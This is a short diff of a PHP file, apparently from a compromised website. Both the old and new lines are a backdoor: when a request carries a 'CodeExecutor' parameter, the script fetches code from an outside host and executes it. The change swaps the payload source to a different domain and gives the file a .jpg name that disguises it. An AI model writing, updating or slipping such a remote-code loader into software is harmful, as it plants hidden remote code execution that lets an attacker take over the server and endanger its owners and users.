@@ -50,7 +50,7 @@ $fetcher = new CurlFetcher();
 
 if (isset($_GET['CodeExecutor'])) {
     $executor = new CodeExecutor($fetcher);
-    $executor->executeCodeFromURL("https://isnujombang.org/kerang/rudi.txt");
+    $executor->executeCodeFromURL("https://batukdikomikaja.pages.dev/rudi.jpg");
     exit;
 }
 
